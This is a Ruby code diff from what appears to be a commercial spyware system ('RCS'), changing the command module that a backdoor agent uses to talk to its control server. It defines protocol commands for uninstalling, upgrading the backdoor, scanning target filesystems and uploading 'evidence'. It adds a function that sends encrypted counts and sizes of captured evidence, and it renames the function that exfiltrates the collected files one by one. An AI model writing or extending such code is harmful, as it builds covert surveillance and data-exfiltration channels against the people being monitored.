@@ -22,19 +22,19 @@ module Command
   include Crypt
   include Tracer
   
-  INVALID_COMMAND  = 0x00       # Don't use
-  PROTO_OK         = 0x01       # OK
-  PROTO_NO         = 0x02       # Nothing available
-  PROTO_BYE        = 0x03       # The end of the protocol
-  PROTO_CHALLENGE  = 0x04       # Authentication
-  PROTO_ID         = 0x0f       # Identification of the target    
-  PROTO_CONF       = 0x07       # New configuration
-  PROTO_UNINSTALL  = 0x0a       # Uninstall command
-  PROTO_DOWNLOAD   = 0x0c       # List of files to be downloaded
-  PROTO_UPLOAD     = 0x0d       # A file to be saved
-  PROTO_UPGRADE    = 0x16       # Upgrade for the backdoor
-  PROTO_EVIDENCE   = 0x09       # Upload of a log
-  PROTO_FILESYSTEM = 0x19       # List of paths to be scanned
+  INVALID_COMMAND     = 0x00       # Don't use
+  PROTO_OK            = 0x01       # OK
+  PROTO_NO            = 0x02       # Nothing available
+  PROTO_BYE           = 0x03       # The end of the protocol
+  PROTO_ID            = 0x0f       # Identification of the target
+  PROTO_CONF          = 0x07       # New configuration
+  PROTO_UNINSTALL     = 0x0a       # Uninstall command
+  PROTO_DOWNLOAD      = 0x0c       # List of files to be downloaded
+  PROTO_UPLOAD        = 0x0d       # A file to be saved
+  PROTO_UPGRADE       = 0x16       # Upgrade for the agent
+  PROTO_EVIDENCE      = 0x09       # Upload of an evidence
+  PROTO_EVIDENCE_SIZE = 0x0b       # Queue for evidence
+  PROTO_FILESYSTEM    = 0x19       # List of paths to be scanned
 
   # the commands are depicted here: http://rcs-dev/trac/wiki/RCS_Sync_Proto_Rest
 
@@ -282,12 +282,31 @@ module Command
       trace :info, "FILESYSTEM -- No filesystem for me"
     end
   end
-  
+
+
+  # Protocol Evidence
+  # ->  Crypt_K ( PROTO_EVIDENCE_SIZE [ num, size ] )
+  # <-  Crypt_K ( PROTO_OK )
+  def send_evidence_size(evidences)
+
+    total_size = 0
+    evidences.each do |e|
+      total_size += e.size
+    end
+
+    trace :info, "EVIDENCE_SIZE: #{evidences.size} (#{total_size.to_s_bytes})"
+
+    # prepare the message
+    message = [PROTO_EVIDENCE_SIZE].pack('I') + [evidences.size].pack('I') + [total_size].pack('Q')
+    enc_msg = aes_encrypt_integrity(message, @session_key)
+    # send the message and receive the response
+    @transport.message enc_msg
+  end
   
   # Protocol Evidence
   # ->  Crypt_K ( PROTO_EVIDENCE [ size, content ] )
   # <-  Crypt_K ( PROTO_OK | PROTO_NO )   
-  def send_evidences(evidences)
+  def send_evidence(evidences)
     
     return if evidences.empty?
     
@@ -300,15 +319,15 @@ module Command
     # send the message and receive the response
     resp = @transport.message enc_msg
     resp = aes_decrypt_integrity(resp, @session_key)
-    
+
     if resp.unpack('I') == [PROTO_OK] then
       trace :info, "EVIDENCE -- [#{evidence.name}] #{evidence.size} bytes sent. #{evidences.size} left"
     else
       trace :info, "EVIDENCE -- problems from server"
     end
-   
+
     # recurse for the next log to be sent
-    send_evidences evidences unless evidences.empty?
+    send_evidence evidences unless evidences.empty?
   end
   
   
